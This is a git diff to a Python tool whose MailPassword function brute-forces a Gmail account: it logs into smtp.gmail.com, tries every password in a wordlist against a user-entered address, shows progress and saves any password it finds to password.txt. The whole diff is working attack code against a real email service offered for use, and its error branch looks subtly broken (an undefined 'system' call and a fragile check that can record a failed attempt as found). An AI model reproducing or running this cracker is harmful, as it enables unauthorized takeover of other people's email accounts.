@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 import os 
 import imghdr  
 from time import sleep
@@ -26,26 +28,42 @@ def banner():
 
 def MailPassword(): 
     gmail = str(input("[*] Enter the email: "))
-
+    i = 0
     try:
-        server = smtplib.SMTP('smtp.gmail.com:587')
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.ehlo()
-        server.starttls()
-
         passwfile = open('src/wordlist.txt', 'r')
-
-        for password in passwfile:
+        pass_list = passwfile.readlines()
+        for password in pass_list:
+            i += 1
+            print(f'[{str(i)}' + '/' + f'{str(len(pass_list))}]')
             try:
                 server.login(gmail, password)
-                print("[+] Email: {} - Password: {}".format(gmail, password))
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print()
+                print(f'[+] Email: {gmail} - Password founded: {password}')
+                with open('password.txt', 'at+', encoding='utf-8') as p: 
+                    p.write(f'[+] Email: {gmail} - Password founded: {password}')
+
                 break
 
-            except smtplib.SMTPAuthenticationError:
-                print("[+] Email: {} - Try this password: {}".format(gmail, password))
-    
-    except Exception as e: 
+            except smtplib.SMTPAuthenticationError as e:
+                error = str(e)
+                if error[14] == '<':
+                    system('cls' if os.name == 'nt' else 'clear')
+                    main()
+                    print(f'[+] Email: {gmail} - Password founded: {password}')
+                    with open('password.txt', 'at+', encoding='utf-8') as p: 
+                        p.write(f'[+] Email: {gmail} - Password founded: {password}')
+
+                    break
+
+                else:
+                    print(f'[!] Password not found => {password}')
+                
+    except Exception as ex: 
         print()
-        print(f'\033[31m ![ERROR] {e}\033[0m')
+        print(f'\033[31m ![ERROR] {ex}\033[0m')
 
 
 def MailSender(send_email, rec_email, password): 
@@ -120,6 +138,7 @@ if __name__=='__main__':
                 sleep(2)
                 
                 # Credentials
+                # Enter the emails that will send and receive here, and in the .env file.
                 send_email = os.getenv('SEND_MAIL')
                 rec_email = os.getenv('REC_EMAIL')
                 password = getpass.getpass('[*] Enter your password: ')
